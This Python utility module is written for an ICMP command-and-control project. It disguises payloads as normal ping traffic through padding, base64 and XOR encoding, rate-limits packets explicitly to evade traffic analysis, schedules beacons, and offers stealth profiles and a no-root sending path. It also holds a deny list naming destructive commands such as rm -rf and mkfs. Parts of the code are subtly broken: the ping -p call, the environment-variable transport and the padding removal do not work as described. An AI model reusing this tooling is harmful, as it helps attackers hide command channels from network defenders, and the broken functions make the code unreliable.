#!/usr/bin/env python3
"""
Utility functions for ICMP C2 project fixes
"""
import os
import ipaddress
import socket
import subprocess
import time
import random
import base64
import hashlib
import threading
import re
import uuid
from typing import Optional, Tuple

def get_default_interface() -> str:
    """
    Auto-detect the default network interface
    """
    try:
        # Try to get the default gateway interface
        result = subprocess.run(['ip', 'route', 'show', 'default'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            lines = result.stdout.strip().split('\n')
            if lines:
                # Extract interface name from "default via X.X.X.X dev INTERFACE"
                parts = lines[0].split()
                for i, part in enumerate(parts):
                    if part == 'dev' and i + 1 < len(parts):
                        return parts[i + 1]
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
        pass
    
    # Fallback: try common interface names
    common_interfaces = ['eth0', 'ens33', 'wlo1', 'wlan0', 'en0']
    for interface in common_interfaces:
        try:
            # Check if interface exists
            with open(f'/sys/class/net/{interface}/operstate', 'r') as f:
                if f.read().strip() == 'up':
                    return interface
        except FileNotFoundError:
            continue
    
    return 'eth0'  # Final fallback

def validate_ip(ip: str) -> bool:
    """
    Validate IP address format
    """
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def safe_path(path: str) -> str:
    """
    Sanitize file path to prevent directory traversal
    """
    # Remove any leading slashes and normalize path
    safe_path = os.path.normpath(path).lstrip(os.sep)
    # Remove any remaining dangerous characters and patterns
    safe_path = safe_path.replace('..', '').replace('//', '/')
    # Remove any remaining slashes at the beginning
    safe_path = safe_path.lstrip('/')
    # Replace any remaining dangerous characters
    safe_path = re.sub(r'[<>:"|?*]', '_', safe_path)
    return safe_path

def validate_command(command: str) -> bool:
    """
    Enhanced command validation to prevent command injection
    """
    dangerous_commands = [
        'rm -rf', 'dd if=', 'mkfs', 'fdisk', '$(', '`', '|', ';', '&&', '||',
        '>', '<', '>>', '<<', 'exec', 'eval', 'system', 'subprocess'
    ]
    command_lower = command.lower()
    
    # Check for dangerous patterns
    for dangerous in dangerous_commands:
        if dangerous in command_lower:
            return False
    
    # Check for command substitution
    if any(char in command for char in ['$', '`', '(', ')']):
        return False
    
    # Check for shell operators
    if any(op in command for op in ['|', ';', '&&', '||', '>', '<']):
        return False
    
    return True

def get_local_ip() -> Optional[str]:
    """
    Get local IP address
    """
    try:
        # Create a socket to get local IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return None

def check_privileges() -> bool:
    """
    Check if running with sufficient privileges for packet sniffing
    """
    try:
        return os.geteuid() == 0
    except AttributeError:
        # Windows doesn't have geteuid
        return True

def create_directories(*dirs: str) -> None:
    """
    Safely create directories
    """
    for directory in dirs:
        try:
            os.makedirs(directory, exist_ok=True)
        except Exception as e:
            print(f"Warning: Could not create directory {directory}: {e}")

def safe_file_write(filepath: str, content: str, mode: str = 'w') -> bool:
    """
    Safely write to file with error handling
    """
    try:
        # Ensure directory exists
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, mode) as f:
            f.write(content)
        return True
    except Exception as e:
        print(f"Error writing to {filepath}: {e}")
        return False

# -------------------------
# Payload Obfuscation Functions
# -------------------------

def generate_icmp_id() -> int:
    """
    Generate a realistic ICMP ID that looks like normal ping traffic
    """
    # Most ping implementations use process ID or random values
    return random.randint(1, 65535)

def generate_icmp_seq() -> int:
    """
    Generate a realistic ICMP sequence number
    """
    # Normal ping sequences increment by 1
    return random.randint(1, 1000)

def obfuscate_payload(payload: str, obfuscation_level: int = 1) -> str:
    """
    Obfuscate payload to look like normal ICMP traffic
    
    obfuscation_level:
    1 = Basic (add random padding)
    2 = Medium (encode and add realistic data)
    3 = High (full steganography)
    """
    if obfuscation_level == 1:
        # Basic obfuscation: add random padding
        padding_length = random.randint(0, 16)
        padding = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=padding_length))
        return f"{payload}{padding}"
    
    elif obfuscation_level == 2:
        # Medium obfuscation: encode and add realistic data
        # Encode payload in base64 and add realistic ping-like data
        encoded = base64.b64encode(payload.encode()).decode()
        timestamp = str(int(time.time()))
        random_data = ''.join(random.choices('0123456789abcdef', k=8))
        return f"ping:{timestamp}:{random_data}:{encoded}"
    
    elif obfuscation_level == 3:
        # High obfuscation: full steganography
        # Create a realistic ping payload with hidden data
        timestamp = str(int(time.time()))
        random_id = ''.join(random.choices('0123456789abcdef', k=4))
        # Use deterministic key based on payload hash for consistency
        key = int(hashlib.md5(payload.encode()).hexdigest()[:2], 16) % 255 + 1
        hidden_data = ''.join(chr(ord(c) ^ key) for c in payload)
        encoded_hidden = base64.b64encode(hidden_data.encode()).decode()
        return f"PING {timestamp} ({random_id}): {encoded_hidden} data KEY:{key:02x}"
    
    return payload

def deobfuscate_payload(obfuscated_payload: str, obfuscation_level: int = 1) -> str:
    """
    Deobfuscate payload based on the obfuscation level used
    """
    if obfuscation_level == 1:
        # Remove padding (everything after the actual payload)
        # This is a simple approach - in practice you'd need a delimiter
        return obfuscated_payload.rstrip('abcdefghijklmnopqrstuvwxyz0123456789')
    
    elif obfuscation_level == 2:
        # Extract base64 encoded data
        try:
            parts = obfuscated_payload.split(':')
            if len(parts) >= 4 and parts[0] == 'ping':
                encoded_data = parts[3]
                return base64.b64decode(encoded_data).decode()
        except Exception:
            pass
        return obfuscated_payload
    
    elif obfuscation_level == 3:
        # Extract and decode hidden data
        try:
            if obfuscated_payload.startswith('PING '):
                # Extract the encoded part and key
                parts = obfuscated_payload.split('KEY:')
                if len(parts) == 2:
                    encoded_part = parts[0].split(': ')[-1].strip()
                    key_hex = parts[1].strip()
                    key = int(key_hex, 16)
                    # Decode and XOR
                    decoded_data = base64.b64decode(encoded_part).decode()
                    return ''.join(chr(ord(c) ^ key) for c in decoded_data)
        except Exception:
            pass
        return obfuscated_payload
    
    return obfuscated_payload

def generate_realistic_ping_payload() -> str:
    """
    Generate a realistic ping payload that looks like normal ICMP traffic
    """
    patterns = [
        f"PING {random.randint(1000, 9999)} ({random.randint(1000, 9999)}): {random.randint(32, 1472)} data bytes",
        f"ping: {random.randint(1000, 9999)} bytes",
        f"ICMP echo request, id {random.randint(1, 65535)}, seq {random.randint(1, 1000)}",
        f"ping {random.randint(1000, 9999)}",
        f"echo request {random.randint(1, 65535)}"
    ]
    return random.choice(patterns)

# -------------------------
# Rate Limiting Functions
# -------------------------

class RateLimiter:
    """
    Thread-safe rate limiter to prevent detection through traffic analysis
    """
    def __init__(self, max_packets_per_minute: int = 60, max_packets_per_hour: int = 1000):
        self.max_packets_per_minute = max_packets_per_minute
        self.max_packets_per_hour = max_packets_per_hour
        self.packet_times = []
        self.last_cleanup = time.time()
        self.lock = threading.Lock()  # Thread safety
    
    def can_send_packet(self) -> bool:
        """
        Check if we can send a packet based on rate limits
        """
        with self.lock:
            current_time = time.time()
            
            # Clean up old entries (older than 1 hour)
            if current_time - self.last_cleanup > 3600:
                self.packet_times = [t for t in self.packet_times if current_time - t < 3600]
                self.last_cleanup = current_time
            
            # Check minute limit
            recent_packets = [t for t in self.packet_times if current_time - t < 60]
            if len(recent_packets) >= self.max_packets_per_minute:
                return False
            
            # Check hour limit
            if len(self.packet_times) >= self.max_packets_per_hour:
                return False
            
            return True
    
    def record_packet_sent(self):
        """
        Record that a packet was sent
        """
        with self.lock:
            self.packet_times.append(time.time())
    
    def get_wait_time(self) -> float:
        """
        Calculate how long to wait before next packet can be sent
        """
        with self.lock:
            current_time = time.time()
            
            # Check minute limit
            recent_packets = [t for t in self.packet_times if current_time - t < 60]
            if len(recent_packets) >= self.max_packets_per_minute:
                oldest_recent = min(recent_packets)
                return 60 - (current_time - oldest_recent)
            
            # Check hour limit
            if len(self.packet_times) >= self.max_packets_per_hour:
                oldest_packet = min(self.packet_times)
                return 3600 - (current_time - oldest_packet)
            
            return 0.0

# -------------------------
# Timing and Delay Functions
# -------------------------

def add_realistic_delay() -> None:
    """
    Add realistic delay to mimic normal network behavior
    """
    # Random delay between 0.1 and 2 seconds
    delay = random.uniform(0.1, 2.0)
    time.sleep(delay)

def calculate_optimal_packet_size() -> int:
    """
    Calculate optimal packet size based on network conditions
    """
    # For now, return a reasonable default
    return random.choice([56, 64, 128, 256])

def generate_session_id() -> str:
    """
    Generate a unique session ID
    """
    timestamp = str(int(time.time()))
    random_suffix = ''.join(random.choices('0123456789abcdef', k=8))
    return f"sess_{timestamp}_{random_suffix}"

def should_send_beacon() -> bool:
    """
    Determine if a beacon packet should be sent
    """
    return random.random() < 0.05  # 5% chance

def get_stealth_config() -> dict:
    """
    Get stealth configuration - this should import from stealth_config.py
    """
    try:
        from core.stealth_config import get_stealth_config as get_config
        return get_config()
    except ImportError:
        # Fallback configuration
        return {
            'stealth': {
                'obfuscation_level': 3,
                'max_packets_per_minute': 30,
                'max_packets_per_hour': 500
            },
            'normal': {
                'obfuscation_level': 2,
                'max_packets_per_minute': 60,
                'max_packets_per_hour': 1000
            },
            'aggressive': {
                'obfuscation_level': 1,
                'max_packets_per_minute': 120,
                'max_packets_per_hour': 2000
            }
        }

def cleanup_old_sessions(temp_dir: str, max_age_hours: int = 24) -> None:
    """
    Clean up old session files to prevent disk space issues
    """
    try:
        current_time = time.time()
        max_age_seconds = max_age_hours * 3600
        
        for filename in os.listdir(temp_dir):
            filepath = os.path.join(temp_dir, filename)
            try:
                # Check file age
                file_age = current_time - os.path.getmtime(filepath)
                if file_age > max_age_seconds:
                    os.remove(filepath)
                    print(f"Cleaned up old session file: {filename}")
            except (OSError, FileNotFoundError):
                # File might have been deleted by another process
                continue
    except Exception as e:
        print(f"Warning: Error during session cleanup: {e}")

def create_low_privilege_mode() -> dict:
    """
    Create a low-privilege mode configuration that uses standard tools
    """
    return {
        'use_standard_ping': True,
        'ping_command': 'ping',
        'max_payload_size': 56,  # Standard ping payload size
        'use_environment_vars': True,
        'fallback_to_raw': False
    }

def send_icmp_low_privilege(target_ip: str, payload: str) -> bool:
    """
    Send ICMP packet using standard ping command (no root required)
    """
    try:
        # Encode payload in a way that can be transmitted via ping
        # Use environment variables or ping data to carry payload
        encoded_payload = base64.b64encode(payload.encode()).decode()
        
        # Method 1: Use ping with custom data (if supported)
        try:
            # Some ping implementations support custom data
            result = subprocess.run([
                'ping', '-c', '1', '-p', encoded_payload[:16], target_ip
            ], capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        
        # Method 2: Use ping with environment variables
        env = os.environ.copy()
        env['ICMP_PAYLOAD'] = encoded_payload
        
        result = subprocess.run([
            'ping', '-c', '1', target_ip
        ], capture_output=True, text=True, timeout=10, env=env)
        
        return result.returncode == 0
        
    except Exception as e:
        print(f"Error in low privilege mode: {e}")
        return False

def receive_icmp_low_privilege(callback_function) -> None:
    """
    Receive ICMP packets using standard tools (no root required)
    """
    try:
        # Method 1: Use tcpdump if available (might still need privileges)
        try:
            process = subprocess.Popen([
                'tcpdump', '-i', 'any', '-n', 'icmp', '-A'
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            for line in process.stdout:
                if 'ICMP' in line:
                    # Parse tcpdump output and call callback
                    callback_function(line)
                    
        except (FileNotFoundError, PermissionError):
            pass
        
        # Method 2: Use netstat or similar tools
        try:
            process = subprocess.Popen([
                'netstat', '-i'
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Monitor network interface statistics
            # This is limited but doesn't require privileges
            
        except (FileNotFoundError, PermissionError):
            pass
            
    except Exception as e:
        print(f"Error in low privilege receive mode: {e}") 